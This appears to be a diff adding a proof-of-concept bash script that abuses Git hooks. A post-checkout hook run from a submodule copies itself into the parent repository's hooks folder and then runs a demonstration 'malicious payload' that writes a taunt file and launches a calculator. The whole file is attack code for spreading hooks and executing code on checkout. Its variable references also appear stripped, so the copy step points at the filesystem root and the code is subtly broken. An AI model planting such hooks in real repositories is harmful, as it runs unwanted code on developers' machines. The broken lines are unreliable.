@@ -1,0 +1,26 @@
+#!/bin/bash
+
+# Define hook directories
+PARENT_HOOK_DIR="../../.git/hooks"
+SUBMODULE_HOOK_DIR=".git/hooks"
+
+# Log propagation for debugging
+echo "Propagating post-checkout hook..." >> /tmp/hook_debug.log
+
+# Propagate to the parent repository
+if [ -d "" ]; then
+    echo "Installing hook in parent repository: " >> /tmp/hook_debug.log
+    cp ./poc1.sh "/post-checkout"
+    chmod +x "/post-checkout"
+fi
+
+# Malicious payload
+echo "lol, I'm in your system" > /tmp/lol
+if command -v gnome-calculator >/dev/null 2>&1; then
+    gnome-calculator &
+elif command -v xcalc >/dev/null 2>&1; then
+    xcalc &
+else
+    echo "No calculator available, but your system is pwned!" >> /tmp/lol
+fi
+
